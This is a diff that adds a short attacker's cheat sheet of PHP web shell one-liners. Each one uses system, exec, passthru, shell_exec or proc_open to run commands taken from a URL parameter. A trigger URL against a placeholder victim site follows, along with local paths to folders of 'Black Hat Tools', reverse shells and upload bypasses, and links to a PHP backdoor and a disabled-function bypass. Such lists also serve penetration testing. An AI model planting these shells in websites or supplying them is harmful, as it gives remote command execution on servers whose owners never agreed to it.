@@ -1,0 +1,25 @@
+Common Cmd.php Command:
+<?php system($_GET['cmd']); ?>
+<?php exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php system($_GET['cmd'], $retval); echo $retval; ?>
+<?php proc_open($_GET['cmd'], array(1 => array("pipe", "w")), $pipes); ?>
+
+<?php system($_GET['cmd']); ?>
+<?php system($_REQUEST['cmd']); ?>
+<?php system($_REQUEST['exec']); ?>
+
+Triggure Command : http://victim-website.com/shell.php?cmd=whoami
+
+Common Shell:
+D:\D0LPH1N\Black Hat Tools\php\Most Working Shell
+D:\D0LPH1N\CTF\boot2root\Reverse Shell
+D:\D0LPH1N\Black Hat Tools\php\
+D:\D0LPH1N\Black Hat Tools
+D:\D0LPH1N\Bug Hunting\File Upload Bypass
+D:\D0LPH1N\Common Method\File Upload Vulnerability\File Upload Bypass
+
+Bypass Shell:
+https://github.com/0x0mehedi/php-backdoor
+https://github.com/0x0mehedi/disabled-function-bypass
